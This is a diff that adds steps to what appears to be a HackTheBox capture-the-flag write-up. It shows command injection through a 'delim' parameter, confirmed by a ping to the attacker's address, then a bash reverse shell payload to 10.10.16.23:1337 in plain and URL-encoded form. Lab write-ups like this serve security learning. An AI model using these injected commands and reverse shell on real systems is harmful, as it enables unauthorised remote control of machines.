@@ -175,4 +175,30 @@ Nmap done: 1 IP address (1 host up) scanned in 16.77 seconds
 
 23. To test whether our argument is true or not, we can use bash command to ping our tun0 interface then check it on our local machine.
 
+> COMMAND
+
+```
+delim=comma;ping -c 4 10.10.16.23 #
+
+delim=comma;ping%20-c%204%2010.10.16.23%20#
+```
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/a733fefc-acc7-4d69-8c10-34afbf6b8b55)
+
+
+24. Great! It indeed execute our bash command, we can drop our reverse shell now.
+
+> REVSHELL PAYLOAD
+
+```
+delim=;bash -c 'bash -i >& /dev/tcp/10.10.16.23/1337 0>&1';
+
+delim%3D%3Bbash%20%2Dc%20%27bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F10%2E10%2E16%2E23%2F1337%200%3E%261%27%3B
+```
+
+
+
+
+
+
  
